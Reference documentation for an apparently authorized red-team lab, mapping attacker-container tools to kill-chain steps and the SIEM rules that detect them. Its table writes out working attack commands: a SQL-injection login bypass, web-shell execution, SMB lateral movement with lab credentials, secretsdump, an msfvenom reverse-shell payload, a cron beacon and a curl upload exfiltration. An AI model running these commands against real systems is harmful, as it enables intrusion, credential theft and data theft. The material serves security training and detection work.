# Red team tooling — tool → video-term mapping (reference documentation)

> Reference documentation — authorized lab use only.

Every tool in the `attacker` container exists to make a term from the video
runnable. The mapping is the point: a tool is *how* a TTP is executed, and
each row below links to the phase where it appears.

| Tool (in this image) | Video term it demonstrates | Typical use in the range |
|---|---|---|
| `nmap` | reconnaissance (kill chain step 1) | `sudo nmap -sV -Pn -T4 --host-timeout 180s -p 22,80,443,445,3306,3389 172.31.100.1` — phase 1 |
| `curl` | initial access (web exploit delivery, step 2) | the `admin' OR 1=1--` login bypass against `/login` — phase 2 |
| `/console?token=DEV-2026` (on the target, driven by curl) | execution (step 3) | `cmd=id`, `cmd=cat /srv/notes/deployment.txt` — phases 2–3 |
| `nmap` (internal probes via the web shell) | discovery / TTP mapping | port sweeps from web01 that show which east-west paths the firewall allows — phase 3 |
| `netexec` | lateral movement (step 6) | `timeout 20 netexec smb 10.10.30.11 -u svc_web -p 'Web#Svc2026!' --shares` (blocked from attack-net; works from a foothold) — phase 4 |
| `smbclient` | SMB / exfiltration staging (steps 6–7) | `smbclient //10.10.30.11/critical -U 'fileshare%F1leShare!2026!' -c 'ls; get q3-financials.csv'` — phases 4–5 |
| `impacket-secretsdump` | credential access (TTP) | `impacket-secretsdump LAB/administrator:'Lab-Admin#2026!'@10.10.30.10` — **blocked from attack-net by the perimeter**; a TTP whose path the segmentation denies |
| `msfvenom` (in metasploit-framework) | execution / payload (step 3) | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.31.100.x LPORT=443 -f elf -o /tmp/lin.elf` — outbound reverse shells from internal hosts are denied by the egress filter (FW-21/22) |
| `cron` (on the target, planted via the web shell) | persistence (step 4) | the 15-minute SMB beacon planted in phase 7 |
| systemd units | persistence (step 4) | the cron entry is the lab stand-in; on real Linux hosts a user-level systemd unit or timer plays the same role |
| `tar` + `curl --upload-file` | exfiltration (step 7) | stage `/tmp/staging/exfil.tar.gz`, PUT it to the receiver on the attacker over the allowed 443 path — phase 6 |
| `tcpdump` | (blue-team lens) traffic analysis | `sudo tcpdump -i eth0 port 445` in the attacker container to watch the beacons |
| `dnsutils`, `jq`, `nano`, `openssh-client` | supporting tooling | dig lookups, JSON wrangling, editing, SSH client |

## Reading the mapping as blue team

Each row's action leaves a distinct trace, which is what the SIEM rules and
the runbook are keyed on:

- scans → `FW-EDGE-DENY` bursts (SIEM 100900/100901)
- the bypass → `AUTH-BYPASS` (SIEM 100910)
- web shell use → `CONSOLE-EXEC` (SIEM 100911)
- share reads → `smbd_audit ... critical|open|ok` (SIEM 100920)
- blocked lateral/egress → `FW-LATERAL-DENY` / `FW-EGRESS-DENY` (SIEM 100902/100930/100931)
- beacons → periodic `smbd_audit ... public|connect` entries from the same host (timing IoA)

Note that several classic TTPs (secretsdump from outside, reverse shells,
SMB exfil to the internet) are *present as tools but denied as paths* — that
is the segmentation lesson, not a limitation: the defender's rules decide
which TTPs are even reachable.
